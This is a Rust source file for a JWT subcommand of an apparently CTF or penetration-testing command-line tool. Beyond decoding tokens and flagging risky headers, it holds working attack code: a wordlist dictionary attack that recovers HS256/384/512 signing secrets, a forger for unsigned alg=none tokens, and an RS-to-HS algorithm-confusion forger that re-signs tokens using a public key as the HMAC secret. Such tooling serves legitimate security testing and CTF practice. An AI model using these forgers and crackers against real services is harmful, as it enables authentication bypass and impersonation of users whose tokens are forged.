use anyhow::{Context, Result};
use base64::{Engine, engine::general_purpose::URL_SAFE_NO_PAD};
use clap::Subcommand;
use std::path::PathBuf;

use super::hmac;

#[derive(Subcommand)]
pub enum JwtAction {
    #[command(about = "Decode a JWT token (without verification)")]
    Decode {
        #[arg(help = "JWT token string")]
        token: String,
    },
    #[command(about = "Analyze a JWT token for potential vulnerabilities")]
    Analyze {
        #[arg(help = "JWT token string")]
        token: String,
    },
    #[command(about = "Dictionary-attack the HMAC secret of an HS* JWT")]
    Crack {
        #[arg(help = "JWT token string")]
        token: String,
        #[arg(short, long, help = "Wordlist file (one secret per line)")]
        wordlist: PathBuf,
    },
    #[command(about = "Forge a token with alg=none (empty signature)")]
    ForgeNone {
        #[arg(
            help = "Existing JWT (payload kept) or raw JSON payload string",
            required_unless_present = "payload"
        )]
        token: Option<String>,
        #[arg(short, long, help = "Raw JSON payload (overrides token payload)")]
        payload: Option<String>,
    },
    #[command(
        about = "Algorithm-confusion forge: re-sign RS* token as HS256 using a public key file as HMAC secret"
    )]
    Confuse {
        #[arg(help = "JWT token string (header/payload source)")]
        token: String,
        #[arg(
            short,
            long,
            help = "Public key file (PEM or raw bytes used as HMAC secret)"
        )]
        key: PathBuf,
        #[arg(
            long,
            default_value = "HS256",
            help = "Symmetric algorithm to forge (HS256/HS384/HS512)"
        )]
        alg: String,
    },
}

pub fn run(action: JwtAction) -> Result<()> {
    match action {
        JwtAction::Decode { token } => {
            let parts = decode(&token)?;
            println!("Header:    {}", parts.header);
            println!("Payload:   {}", parts.payload);
            println!("Signature: {}", parts.signature_hex);
        }
        JwtAction::Analyze { token } => {
            let parts = decode(&token)?;
            println!("Header:    {}", parts.header);
            println!("Payload:   {}", parts.payload);
            println!("Algorithm: {}", extract_algorithm(&parts.header));
            println!();
            let warnings = find_vulnerabilities(&parts.header);
            if warnings.is_empty() {
                println!("No obvious vulnerabilities detected.");
            } else {
                println!("Potential vulnerabilities:");
                for w in &warnings {
                    println!("  [!] {}", w);
                }
            }
        }
        JwtAction::Crack { token, wordlist } => match crack_hmac_secret(&token, &wordlist)? {
            Some(secret) => println!("Found secret: {}", secret),
            None => println!("Not found"),
        },
        JwtAction::ForgeNone { token, payload } => {
            let payload_json = if let Some(p) = payload {
                p
            } else if let Some(t) = token {
                decode(&t)?.payload
            } else {
                anyhow::bail!("Provide a token or --payload");
            };
            let forged = forge_none(&payload_json)?;
            println!("{}", forged);
        }
        JwtAction::Confuse { token, key, alg } => {
            let key_bytes = std::fs::read(&key)
                .with_context(|| format!("Failed to read key file: {}", key.display()))?;
            let forged = forge_alg_confusion(&token, &key_bytes, &alg)?;
            println!("{}", forged);
        }
    }
    Ok(())
}

pub struct JwtParts {
    pub header: String,
    pub payload: String,
    pub signature_hex: String,
}

/// Maximum encoded JWT length in bytes.
///
/// SECURITY: Unbounded tokens are a memory/CPU DoS. `split('.')` can allocate
/// a slice per delimiter, and base64-decoding header/payload/signature grows
/// with input. Typical JWTs are a few kilobytes; 64 KiB still covers oversized
/// CTF tokens (embedded certs, large claims).
pub const MAX_JWT_LEN: usize = 64 * 1024;

fn split_jwt(token: &str) -> Result<[&str; 3]> {
    let token = token.trim();
    if token.len() > MAX_JWT_LEN {
        anyhow::bail!(
            "JWT exceeds maximum length of {} bytes to prevent Denial of Service",
            MAX_JWT_LEN
        );
    }
    // splitn(4) bounds allocation even if the token is packed with dots.
    let mut parts = token.splitn(4, '.');
    match (parts.next(), parts.next(), parts.next(), parts.next()) {
        (Some(header), Some(payload), Some(signature), None) => Ok([header, payload, signature]),
        _ => anyhow::bail!("Invalid JWT format: expected 3 dot-separated parts"),
    }
}

pub fn decode(token: &str) -> Result<JwtParts> {
    let [header_b64, payload_b64, sig_b64] = split_jwt(token)?;

    let header_bytes = URL_SAFE_NO_PAD
        .decode(header_b64)
        .context("Failed to decode JWT header (invalid base64url)")?;
    let header = String::from_utf8(header_bytes).context("JWT header is not valid UTF-8")?;

    let payload_bytes = URL_SAFE_NO_PAD
        .decode(payload_b64)
        .context("Failed to decode JWT payload (invalid base64url)")?;
    let payload = String::from_utf8(payload_bytes).context("JWT payload is not valid UTF-8")?;

    let sig_bytes = URL_SAFE_NO_PAD
        .decode(sig_b64)
        .context("Failed to decode JWT signature (invalid base64url)")?;
    let signature_hex = hex::encode(&sig_bytes);

    Ok(JwtParts {
        header,
        payload,
        signature_hex,
    })
}

pub fn extract_algorithm(header_json: &str) -> String {
    let v: serde_json::Value = serde_json::from_str(header_json).unwrap_or(serde_json::Value::Null);
    v.get("alg")
        .and_then(|v| v.as_str())
        .unwrap_or("unknown")
        .to_string()
}

pub fn find_vulnerabilities(header_json: &str) -> Vec<String> {
    let mut warnings = Vec::new();

    let v: serde_json::Value = match serde_json::from_str(header_json) {
        Ok(val) => val,
        Err(_) => return vec!["Invalid JSON header - parsing failed".to_string()],
    };

    let alg = v.get("alg").and_then(|v| v.as_str()).unwrap_or("unknown");
    let alg_lower = alg.to_lowercase();

    if alg_lower == "none" {
        warnings.push("Algorithm is \"none\" - signature verification is disabled!".to_string());
    }

    if alg_lower == "hs256" || alg_lower == "hs384" || alg_lower == "hs512" {
        warnings.push(format!(
            "Symmetric algorithm ({}) - check for algorithm confusion attacks (RS256 -> HS256)",
            alg
        ));
    }

    if v.get("jku").is_some() {
        warnings.push(
            "\"jku\" (JWK Set URL) header present - possible SSRF or key injection".to_string(),
        );
    }

    if v.get("x5u").is_some() {
        warnings.push(
            "\"x5u\" (X.509 URL) header present - possible SSRF or key injection".to_string(),
        );
    }

    if v.get("kid").is_some() {
        warnings.push(
            "\"kid\" (Key ID) header present - check for SQL injection or path traversal"
                .to_string(),
        );
    }

    if v.get("jwk").is_some() {
        warnings.push(
            "\"jwk\" (embedded key) header present - possible key self-signing attack".to_string(),
        );
    }

    warnings
}

fn signing_input(token: &str) -> Result<String> {
    let [header, payload, _] = split_jwt(token)?;
    Ok(format!("{}.{}", header, payload))
}

fn signature_bytes(token: &str) -> Result<Vec<u8>> {
    let [_, _, signature] = split_jwt(token)?;
    URL_SAFE_NO_PAD
        .decode(signature)
        .context("Failed to decode JWT signature")
}

/// Verify an HS* JWT against a candidate secret.
pub fn verify_hs(token: &str, secret: &[u8]) -> Result<bool> {
    let parts = decode(token)?;
    let alg = extract_algorithm(&parts.header).to_ascii_uppercase();
    let msg = signing_input(token)?;
    let expected = signature_bytes(token)?;
    let actual = match alg.as_str() {
        "HS256" => {
            let hex = hmac::hmac_sha256(secret, msg.as_bytes());
            hex::decode(hex).context("internal hex decode")?
        }
        "HS384" => {
            use sha2::Sha384;
            hmac_digest::<Sha384>(secret, msg.as_bytes(), 128)
        }
        "HS512" => {
            let hex = hmac::hmac_sha512(secret, msg.as_bytes());
            hex::decode(hex).context("internal hex decode")?
        }
        other => anyhow::bail!("Unsupported or non-HMAC algorithm for crack: {}", other),
    };
    Ok(constant_time_eq(&expected, &actual))
}

fn hmac_digest<D: sha2::Digest>(key: &[u8], message: &[u8], block_size: usize) -> Vec<u8> {
    let actual_key = if key.len() > block_size {
        let mut hasher = D::new();
        hasher.update(key);
        hasher.finalize().to_vec()
    } else {
        key.to_vec()
    };
    let mut padded_key = vec![0u8; block_size];
    padded_key[..actual_key.len()].copy_from_slice(&actual_key);
    let ipad: Vec<u8> = padded_key.iter().map(|&k| k ^ 0x36).collect();
    let opad: Vec<u8> = padded_key.iter().map(|&k| k ^ 0x5c).collect();
    let mut inner = D::new();
    inner.update(&ipad);
    inner.update(message);
    let inner_hash = inner.finalize();
    let mut outer = D::new();
    outer.update(&opad);
    outer.update(&inner_hash);
    outer.finalize().to_vec()
}

fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

pub fn crack_hmac_secret(token: &str, wordlist: &PathBuf) -> Result<Option<String>> {
    let parts = decode(token)?;
    let alg = extract_algorithm(&parts.header).to_ascii_uppercase();
    if !matches!(alg.as_str(), "HS256" | "HS384" | "HS512") {
        anyhow::bail!(
            "Token algorithm is {} (need HS256/HS384/HS512 for dictionary crack)",
            alg
        );
    }

    let bytes = std::fs::read(wordlist)
        .with_context(|| format!("Failed to read wordlist: {}", wordlist.display()))?;
    for line in bytes.split(|&b| b == b'\n') {
        let line = line.strip_suffix(b"\r").unwrap_or(line);
        if line.is_empty() {
            continue;
        }
        if verify_hs(token, line)? {
            return Ok(Some(String::from_utf8_lossy(line).into_owned()));
        }
    }
    Ok(None)
}

/// Forge alg=none token (header with none + given payload + empty signature).
pub fn forge_none(payload_json: &str) -> Result<String> {
    let _: serde_json::Value =
        serde_json::from_str(payload_json).context("Payload is not valid JSON")?;
    let header = r#"{"alg":"none","typ":"JWT"}"#;
    let h = URL_SAFE_NO_PAD.encode(header.as_bytes());
    let p = URL_SAFE_NO_PAD.encode(payload_json.as_bytes());
    // Empty signature segment (some libs accept trailing dot with empty sig)
    Ok(format!("{}.{}.", h, p))
}

/// Re-sign token header/payload as HS* using arbitrary key material (alg confusion).
pub fn forge_alg_confusion(token: &str, key: &[u8], alg: &str) -> Result<String> {
    let parts = decode(token)?;
    let alg_up = alg.to_ascii_uppercase();
    if !matches!(alg_up.as_str(), "HS256" | "HS384" | "HS512") {
        anyhow::bail!("Forge algorithm must be HS256, HS384, or HS512");
    }

    let mut header_val: serde_json::Value =
        serde_json::from_str(&parts.header).context("Invalid header JSON")?;
    header_val["alg"] = serde_json::Value::String(alg_up.clone());
    let header_json = serde_json::to_string(&header_val)?;

    let h = URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    let p = URL_SAFE_NO_PAD.encode(parts.payload.as_bytes());
    let signing = format!("{}.{}", h, p);

    let sig = match alg_up.as_str() {
        "HS256" => {
            let hex = hmac::hmac_sha256(key, signing.as_bytes());
            hex::decode(hex).context("internal hex decode")?
        }
        "HS384" => {
            use sha2::Sha384;
            hmac_digest::<Sha384>(key, signing.as_bytes(), 128)
        }
        "HS512" => {
            let hex = hmac::hmac_sha512(key, signing.as_bytes());
            hex::decode(hex).context("internal hex decode")?
        }
        _ => unreachable!(),
    };
    let s = URL_SAFE_NO_PAD.encode(&sig);
    Ok(format!("{}.{}.{}", h, p, s))
}

/// Crack against an in-memory list of secrets (for tests).
pub fn crack_hmac_secret_list(token: &str, secrets: &[&str]) -> Result<Option<String>> {
    for s in secrets {
        if verify_hs(token, s.as_bytes())? {
            return Ok(Some((*s).to_string()));
        }
    }
    Ok(None)
}
